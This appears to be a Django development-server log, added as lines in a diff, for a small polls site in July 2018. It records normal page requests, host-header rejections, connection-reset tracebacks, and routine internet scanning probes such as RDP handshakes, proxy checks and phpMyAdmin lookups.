+[06/Jul/2018 21:18:04] "HEAD / HTTP/1.0" 400 58390
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[06/Jul/2018 23:18:56] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 58659
+[06/Jul/2018 23:36:36] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 23:36:36] "GET /static/polls/style_home.css HTTP/1.1" 200 209
+[06/Jul/2018 23:36:36] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+Not Found: /favicon.ico
+[06/Jul/2018 23:36:37] "GET /favicon.ico HTTP/1.1" 404 2083
+[06/Jul/2018 23:37:21] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 23:37:38] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 23:37:49] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 23:37:49] "GET /static/polls/style_home.css HTTP/1.1" 200 209
+[06/Jul/2018 23:37:49] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+[06/Jul/2018 23:37:58] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 23:38:01] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 23:38:03] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 23:38:04] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 23:38:05] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 23:38:09] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 23:38:13] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 23:38:14] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 23:38:15] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 23:38:15] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 23:38:16] "GET /polls/home/ HTTP/1.1" 200 2097
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[07/Jul/2018 00:07:56] "HEAD / HTTP/1.0" 400 58388
+Not Found: /
+[07/Jul/2018 05:15:13] "GET / HTTP/1.1" 404 2032
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[07/Jul/2018 06:13:31] "GET / HTTP/1.0" 400 58382
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[07/Jul/2018 08:24:40] "GET / HTTP/1.0" 400 58383
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 796, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[07/Jul/2018 08:24:40] "GET / HTTP/1.0" 500 59
+----------------------------------------
+Exception happened during processing of request from ('187.227.71.204', 48500)
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 796, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/usr/local/python3/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
+    super().handle_error()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 647, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 357, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 717, in __init__
+    self.handle()
+  File "/usr/local/python3/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
+    handler.run(self.server.get_app())
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/usr/local/python3/lib/python3.7/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+[07/Jul/2018 10:29:59] "GET /polls/home/ HTTP/1.1" 200 2097
+[07/Jul/2018 10:29:59] "GET /static/polls/style_home.css HTTP/1.1" 200 209
+[07/Jul/2018 10:29:59] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+Not Found: /favicon.ico
+[07/Jul/2018 10:29:59] "GET /favicon.ico HTTP/1.1" 404 2083
+[07/Jul/2018 18:03:19] "GET /polls/home/ HTTP/1.1" 200 2097
+[07/Jul/2018 18:03:19] "GET /static/polls/style_home.css HTTP/1.1" 200 209
+[07/Jul/2018 18:03:20] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+Not Found: /favicon.ico
+[07/Jul/2018 18:03:20] "GET /favicon.ico HTTP/1.1" 404 2083
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[07/Jul/2018 19:06:45] "HEAD / HTTP/1.0" 400 58390
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[07/Jul/2018 19:36:47] "HEAD / HTTP/1.0" 400 58391
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[07/Jul/2018 21:53:57] "GET / HTTP/1.0" 400 58380
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[07/Jul/2018 23:10:03] "HEAD / HTTP/1.0" 400 58389
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[08/Jul/2018 04:02:59] "HEAD / HTTP/1.0" 400 58388
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[08/Jul/2018 06:11:58] "HEAD / HTTP/1.0" 400 58391
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[08/Jul/2018 08:53:19] "HEAD / HTTP/1.0" 400 58390
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[08/Jul/2018 13:00:27] "HEAD / HTTP/1.0" 400 58389
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[08/Jul/2018 13:25:05] "HEAD / HTTP/1.0" 400 58389
+Invalid HTTP_HOST header: 'www.so.com'. You may need to add 'www.so.com' to ALLOWED_HOSTS.
+[08/Jul/2018 17:41:45] "GET http://www.so.com/?rands=_1319037410216042862926368 HTTP/1.1" 400 59502
+Invalid HTTP_HOST header: 'www.baidu.com'. You may need to add 'www.baidu.com' to ALLOWED_HOSTS.
+[08/Jul/2018 17:41:46] "GET http://www.baidu.com/?rands=_579082980417036734519440 HTTP/1.1" 400 59574
+Invalid HTTP_HOST header: 'www.search.com'. You may need to add 'www.search.com' to ALLOWED_HOSTS.
+[08/Jul/2018 17:41:48] "GET http://www.search.com/?rands=_298536342623155472976820 HTTP/1.1" 400 59600
+[08/Jul/2018 21:47:26] "GET /polls/home/ HTTP/1.1" 200 2097
+[08/Jul/2018 21:47:26] "GET /static/polls/style_home.css HTTP/1.1" 200 209
+[08/Jul/2018 21:47:27] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+Not Found: /favicon.ico
+[08/Jul/2018 21:47:27] "GET /favicon.ico HTTP/1.1" 404 2083
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[08/Jul/2018 21:54:48] "HEAD / HTTP/1.0" 400 58388
+[09/Jul/2018 00:19:32] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[09/Jul/2018 00:19:32] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[09/Jul/2018 04:53:11] "HEAD / HTTP/1.0" 400 58389
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[09/Jul/2018 09:29:14] "HEAD / HTTP/1.0" 400 58390
+[09/Jul/2018 09:46:24] "GET /polls/home/ HTTP/1.1" 200 2097
+[09/Jul/2018 09:46:25] "GET /static/polls/images/logo.jpg HTTP/1.1" 304 0
+[09/Jul/2018 09:46:25] "GET /static/polls/style_home.css HTTP/1.1" 200 209
+Not Found: /favicon.ico
+[09/Jul/2018 09:46:27] "GET /favicon.ico HTTP/1.1" 404 2083
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[09/Jul/2018 11:43:05] "HEAD / HTTP/1.0" 400 58389
+[09/Jul/2018 17:00:56] "GET /polls/home/ HTTP/1.1" 200 2097
+[09/Jul/2018 17:00:57] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[09/Jul/2018 17:41:25] "GET / HTTP/1.0" 400 58382
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 796, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[09/Jul/2018 17:41:25] "GET / HTTP/1.0" 500 59
+----------------------------------------
+Exception happened during processing of request from ('115.79.249.11', 39684)
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 796, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/usr/local/python3/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
+    super().handle_error()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 647, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 357, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 717, in __init__
+    self.handle()
+  File "/usr/local/python3/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
+    handler.run(self.server.get_app())
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/usr/local/python3/lib/python3.7/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+Not Found: /root
+[09/Jul/2018 17:54:30] "GET /root HTTP/1.1" 404 2062
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[09/Jul/2018 19:04:30] "HEAD / HTTP/1.0" 400 58389
+[10/Jul/2018 11:08:48] "GET /polls/home/ HTTP/1.1" 200 2097
+[10/Jul/2018 11:08:48] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[10/Jul/2018 11:08:49] "GET /static/polls/images/logo.jpg HTTP/1.1" 304 0
+Not Found: /favicon.ico
+[10/Jul/2018 11:08:51] "GET /favicon.ico HTTP/1.1" 404 2083
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[10/Jul/2018 13:34:42] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 58660
+[10/Jul/2018 14:40:40] "GET /polls/home/ HTTP/1.1" 200 2097
+[10/Jul/2018 16:36:20] "GET /polls/home/ HTTP/1.1" 200 2097
+[10/Jul/2018 16:38:10] "GET /polls/home/ HTTP/1.1" 200 2097
+[10/Jul/2018 16:38:13] "GET /static/polls/style_home.css HTTP/1.1" 200 209
+[10/Jul/2018 16:38:14] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[10/Jul/2018 16:43:36] "HEAD / HTTP/1.0" 400 58392
+[10/Jul/2018 17:36:12] "GET /polls/show5 HTTP/1.1" 301 0
+[10/Jul/2018 17:36:13] "GET /polls/show5/ HTTP/1.1" 200 3957
+Not Found: /polls/show5/show5.appcache
+[10/Jul/2018 17:36:13] "GET /polls/show5/show5.appcache HTTP/1.1" 404 3983
+[10/Jul/2018 17:37:05] "GET /polls/show5/ HTTP/1.1" 200 3958
+Not Found: /polls/show5/show5.appcache
+[10/Jul/2018 17:37:06] "GET /polls/show5/show5.appcache HTTP/1.1" 404 3983
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[10/Jul/2018 17:53:46] "HEAD / HTTP/1.0" 400 58390
+[10/Jul/2018 17:58:42] "GET /polls/home/ HTTP/1.1" 200 2097
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[10/Jul/2018 18:38:55] "GET / HTTP/1.0" 400 58381
+Not Found: /
+[10/Jul/2018 19:54:34] "GET / HTTP/1.1" 404 2032
+Not Found: /
+[10/Jul/2018 19:54:35] "GET / HTTP/1.1" 404 2032
+[10/Jul/2018 21:36:41] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
+[10/Jul/2018 21:36:41] "  +&à     Cookie: mstshash=hello" 400 -
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[10/Jul/2018 23:15:25] "HEAD / HTTP/1.0" 400 58390
+[11/Jul/2018 01:28:41] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[11/Jul/2018 01:28:41] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[11/Jul/2018 03:17:01] "HEAD / HTTP/1.0" 400 58391
+[11/Jul/2018 03:20:59] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[11/Jul/2018 03:20:59] "  /*à     Cookie: mstshash=Administr" 400 -
+----------------------------------------
+Exception happened during processing of request from ('5.39.219.64', 58421)
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 647, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 357, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 717, in __init__
+    self.handle()
+  File "/usr/local/python3/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/local/python3/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[11/Jul/2018 04:25:35] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+[11/Jul/2018 04:25:35] "  *%à     Cookie: mstshash=Test" 400 -
+Not Found: /
+[11/Jul/2018 05:40:15] "GET / HTTP/1.1" 404 2032
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[11/Jul/2018 07:44:06] "GET / HTTP/1.0" 400 58384
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[11/Jul/2018 09:17:30] "HEAD / HTTP/1.0" 400 58390
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[11/Jul/2018 11:53:54] "HEAD / HTTP/1.0" 400 58391
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[11/Jul/2018 13:35:49] "HEAD / HTTP/1.0" 400 58390
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[11/Jul/2018 14:12:48] "HEAD / HTTP/1.0" 400 58392
+Not Found: /
+[11/Jul/2018 14:55:45] "GET / HTTP/1.1" 404 2032
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[11/Jul/2018 15:58:15] "HEAD / HTTP/1.0" 400 58391
+[11/Jul/2018 23:00:31] "GET /polls/home/ HTTP/1.1" 200 2097
+[11/Jul/2018 23:00:31] "GET /static/polls/style_home.css HTTP/1.1" 200 209
+[11/Jul/2018 23:00:32] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+Not Found: /favicon.ico
+[11/Jul/2018 23:00:32] "GET /favicon.ico HTTP/1.1" 404 2083
+Not Found: /
+[12/Jul/2018 00:43:49] "GET / HTTP/1.1" 404 2032
+Not Found: /
+[12/Jul/2018 00:43:50] "GET / HTTP/1.1" 404 2032
+[12/Jul/2018 03:50:05] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[12/Jul/2018 03:50:05] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[12/Jul/2018 04:09:59] "HEAD / HTTP/1.0" 400 58384
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[12/Jul/2018 08:20:02] "HEAD / HTTP/1.0" 400 58384
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[12/Jul/2018 09:46:10] "HEAD / HTTP/1.0" 400 58383
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[12/Jul/2018 11:24:52] "HEAD / HTTP/1.0" 400 58384
+[12/Jul/2018 14:22:24] "GET /polls/home/ HTTP/1.1" 200 2097
+[12/Jul/2018 14:22:25] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[12/Jul/2018 14:22:27] "GET /static/polls/images/logo.jpg HTTP/1.1" 304 0
+Not Found: /favicon.ico
+[12/Jul/2018 14:22:30] "GET /favicon.ico HTTP/1.1" 404 2083
+[12/Jul/2018 16:24:35] "GET /polls/home/ HTTP/1.1" 200 2097
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[12/Jul/2018 16:33:45] "HEAD / HTTP/1.0" 400 58382
+[12/Jul/2018 17:28:50] "GET /polls/home/ HTTP/1.1" 200 2097
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[12/Jul/2018 17:31:38] "HEAD / HTTP/1.0" 400 58382
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[12/Jul/2018 19:32:27] "GET / HTTP/1.0" 400 58378
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 796, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[12/Jul/2018 19:32:27] "GET / HTTP/1.0" 500 59
+----------------------------------------
+Exception happened during processing of request from ('113.172.115.148', 45896)
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 796, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/usr/local/python3/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
+    super().handle_error()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 647, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 357, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 717, in __init__
+    self.handle()
+  File "/usr/local/python3/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
+    handler.run(self.server.get_app())
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/usr/local/python3/lib/python3.7/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[12/Jul/2018 20:08:27] "HEAD / HTTP/1.0" 400 58382
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[12/Jul/2018 21:10:56] "HEAD / HTTP/1.0" 400 58383
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[12/Jul/2018 22:09:50] "GET / HTTP/1.0" 400 58377
+[12/Jul/2018 22:53:54] "GET /polls/home/ HTTP/1.1" 200 2097
+[12/Jul/2018 22:53:54] "GET /static/polls/style_home.css HTTP/1.1" 200 209
+[12/Jul/2018 22:53:54] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+Not Found: /favicon.ico
+[12/Jul/2018 22:53:55] "GET /favicon.ico HTTP/1.1" 404 2083
+[12/Jul/2018 23:15:32] "GET /polls/home/ HTTP/1.1" 200 2097
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[12/Jul/2018 23:48:21] "HEAD / HTTP/1.0" 400 58383
+[13/Jul/2018 00:08:12] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[13/Jul/2018 00:08:12] "  /*à     Cookie: mstshash=Administr" 400 -
+Not Found: /
+[13/Jul/2018 02:19:27] "GET / HTTP/1.1" 404 2032
+Not Found: /index.php
+[13/Jul/2018 03:50:44] "GET /index.php HTTP/1.1" 404 2077
+Not Found: /phpMyAdmin/index.php
+[13/Jul/2018 03:50:44] "GET /phpMyAdmin/index.php HTTP/1.1" 404 2110
+[13/Jul/2018 05:09:39] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[13/Jul/2018 05:09:39] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[13/Jul/2018 06:34:55] "HEAD / HTTP/1.0" 400 58385
+Not Found: /
+[13/Jul/2018 08:33:05] "GET / HTTP/1.1" 404 2032
+[13/Jul/2018 10:18:13] "GET /polls/home/ HTTP/1.1" 200 2097
+[13/Jul/2018 10:18:13] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+Not Found: /favicon.ico
+[13/Jul/2018 10:18:22] "GET /favicon.ico HTTP/1.1" 404 2083
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[13/Jul/2018 13:58:27] "HEAD / HTTP/1.0" 400 58383
+[13/Jul/2018 14:14:35] "HEAD / HTTP/1.0" 400 58383
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 796, in write
+    self._sock.sendall(b)
+TimeoutError: [Errno 110] Connection timed out
+[13/Jul/2018 14:14:35] "HEAD / HTTP/1.0" 500 59
+----------------------------------------
+Exception happened during processing of request from ('80.107.33.248', 57310)
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 138, in run
